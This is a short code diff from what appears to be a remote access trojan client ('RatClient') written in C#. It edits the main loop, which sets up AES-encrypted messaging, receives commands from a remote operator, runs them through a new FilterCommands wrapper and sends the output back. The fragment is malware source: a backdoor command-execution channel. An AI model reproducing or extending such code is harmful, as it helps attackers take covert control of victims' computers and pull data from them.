@@ -139,25 +139,27 @@ namespace RatClient
         }
         private void Start()
         {
+            FilterCommands filter = new FilterCommands();
             SetSyncAes();
             while (true)
             {
                 try
                 {
                     string command = Encoding.UTF8.GetString(ReadMsg());
+                    System.Console.WriteLine(command);
                     if (command == "exit")
                     {
                         Console.WriteLine("Ending Session");
                         break;
                     }
-                    SendMsg(Tools.RunCommand(command));
+                    byte[] output = filter.Run(command);
+                    SendMsg(output);
                 }
                 catch
                 {
                     return;
                 }
-            }
-                
+            }                
         }
     }
 }
